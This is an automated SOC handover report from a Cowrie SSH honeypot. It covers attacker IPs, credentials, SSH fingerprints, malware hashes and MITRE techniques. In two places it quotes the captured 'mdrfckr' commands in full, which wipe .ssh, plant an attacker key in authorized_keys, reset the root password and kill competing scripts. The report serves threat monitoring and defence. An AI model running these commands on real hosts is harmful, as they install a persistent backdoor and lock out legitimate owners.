# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-06 |
| **Generated At** | 2026-04-06T18:56:24Z |
| **Shift Time** | 18:56 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **25** |
| Confirmed Threats | **24** |
| False Positives Filtered | **1** (4.0%) |
| Unique Attacker IPs | **4** |
| Countries of Origin | **4** |
| High Severity Cases | **1** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **24** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **3** |
| Unique Credential Pairs | **3** |
| Unique Usernames | **3** |
| Unique Passwords | **3** |
| Successful Auth Pairs | **1** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `jose` | 1 |
| `root` | 1 |
| `john` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 1 |
| `root321..` | 1 |
| `test123` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `jose` | `123456` | 1 |
| `root` | `root321..` | 1 |
| `john` | `test123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root321..` | `120.48.109.159` | 2026-04-06T17:54:40 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **25** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 19 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 11 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 11 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 8 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:FXQGqxoMNhMP"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.109.159`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **4** |
| Unique ASNs | **4** |
| High-Risk ASNs | **2** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS1221` | Telstra Limited | 1 | MEDIUM |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (1)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3ff6b98f867d

| Field | Detail |
|---|---|
| **Source IP** | `120.48.109[.]159` |
| **First Seen** | 2026-04-06 17:54 |
| **Last Seen** | 2026-04-06 17:55 |
| **Session Duration** | 58s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:FXQGqxoMNhMP"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 17:54:37` | `cowrie.session.connect` |
| `2026-04-06 17:54:37` | `cowrie.client.version` |
| `2026-04-06 17:54:37` | `cowrie.client.kex` |
| `2026-04-06 17:54:40` | `cowrie.login.success` |
| `2026-04-06 17:54:41` | `cowrie.session.params` |
| `2026-04-06 17:54:41` | `cowrie.command.input` |
| `2026-04-06 17:54:41` | `cowrie.command.failed` |
| `2026-04-06 17:54:41` | `cowrie.log.closed` |
| `2026-04-06 17:54:42` | `cowrie.session.params` |
| `2026-04-06 17:54:42` | `cowrie.command.input` |
| `2026-04-06 17:54:42` | `cowrie.session.file_download` |
| `2026-04-06 17:54:42` | `cowrie.log.closed` |
| `2026-04-06 17:55:00` | `cowrie.session.params` |
| `2026-04-06 17:55:00` | `cowrie.command.input` |
| `2026-04-06 17:55:04` | `cowrie.log.closed` |
| `2026-04-06 17:55:05` | `cowrie.session.params` |
| `2026-04-06 17:55:05` | `cowrie.command.input` |
| `2026-04-06 17:55:05` | `cowrie.log.closed` |
| `2026-04-06 17:55:06` | `cowrie.session.params` |
| `2026-04-06 17:55:06` | `cowrie.command.input` |
| `2026-04-06 17:55:06` | `cowrie.session.file_download` |
| `2026-04-06 17:55:06` | `cowrie.log.closed` |
| `2026-04-06 17:55:08` | `cowrie.session.params` |
| `2026-04-06 17:55:08` | `cowrie.command.input` |
| `2026-04-06 17:55:08` | `cowrie.log.closed` |
| `2026-04-06 17:55:09` | `cowrie.session.params` |
| `2026-04-06 17:55:09` | `cowrie.command.input` |
| `2026-04-06 17:55:10` | `cowrie.log.closed` |
| `2026-04-06 17:55:11` | `cowrie.session.params` |
| `2026-04-06 17:55:11` | `cowrie.command.input` |
| `2026-04-06 17:55:11` | `cowrie.command.input` |
| `2026-04-06 17:55:11` | `cowrie.log.closed` |
| `2026-04-06 17:55:12` | `cowrie.session.params` |
| `2026-04-06 17:55:12` | `cowrie.command.input` |
| `2026-04-06 17:55:15` | `cowrie.log.closed` |
| `2026-04-06 17:55:16` | `cowrie.session.params` |
| `2026-04-06 17:55:16` | `cowrie.command.input` |
| `2026-04-06 17:55:16` | `cowrie.log.closed` |
| `2026-04-06 17:55:18` | `cowrie.session.params` |
| `2026-04-06 17:55:18` | `cowrie.command.input` |
| `2026-04-06 17:55:18` | `cowrie.log.closed` |
| `2026-04-06 17:55:20` | `cowrie.session.params` |
| `2026-04-06 17:55:20` | `cowrie.command.input` |
| `2026-04-06 17:55:21` | `cowrie.log.closed` |
| `2026-04-06 17:55:21` | `cowrie.session.params` |
| `2026-04-06 17:55:21` | `cowrie.command.input` |
| `2026-04-06 17:55:21` | `cowrie.log.closed` |
| `2026-04-06 17:55:23` | `cowrie.session.params` |
| `2026-04-06 17:55:23` | `cowrie.command.input` |
| `2026-04-06 17:55:26` | `cowrie.log.closed` |
| `2026-04-06 17:55:27` | `cowrie.session.params` |
| `2026-04-06 17:55:27` | `cowrie.command.input` |
| `2026-04-06 17:55:33` | `cowrie.log.closed` |
| `2026-04-06 17:55:34` | `cowrie.session.params` |
| `2026-04-06 17:55:34` | `cowrie.command.input` |
| `2026-04-06 17:55:35` | `cowrie.log.closed` |
| `2026-04-06 17:55:35` | `cowrie.session.params` |
| `2026-04-06 17:55:35` | `cowrie.command.input` |
| `2026-04-06 17:55:35` | `cowrie.log.closed` |
| `2026-04-06 17:55:36` | `cowrie.session.params` |
| `2026-04-06 17:55:36` | `cowrie.command.input` |
| `2026-04-06 17:55:36` | `cowrie.log.closed` |
| `2026-04-06 17:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.109[.]159` to AbuseIPDB if not already reported
- [ ] Block `120.48.109[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `120.48.109[.]159` | **21** | 2026-04-06 17:50 | 2026-04-06 18:22 | 17m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `143.198.196[.]195` | 1 | 2026-04-06 17:55 | 2026-04-06 17:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `60.227.178[.]119` | 1 | 2026-04-06 18:03 | 2026-04-06 18:03 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 42/100 | 🟡 MEDIUM | **31/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 42/100 | 🟡 MEDIUM | **32/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `143.198.196[.]195` | SG | DigitalOcean, LLC | **100** ⚠️ | 50 |
| `120.48.109[.]159` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `60.227.178[.]119` | AU | Telstra Limited | **86** ⚠️ | 0 |
| `104.209.12[.]66` | US | Microsoft Corporation | 14 | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 19 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 2 |
| [T1053.003](https://attack.mitre.org/techniques/T1053/003) | 1 |
| [T1057](https://attack.mitre.org/techniques/T1057) | 1 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 1 |

---

## 🔕 False Positive Summary (1 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 14 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 25 cases |
| Tool 34  | Credential Extractor        | ✅ 3 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 4 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 1 filtered (4.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 4 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 1 priority case(s) shown individually · 3 recon entry/entries in table (1 group(s) consolidating 21 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-06T18:56:24Z_
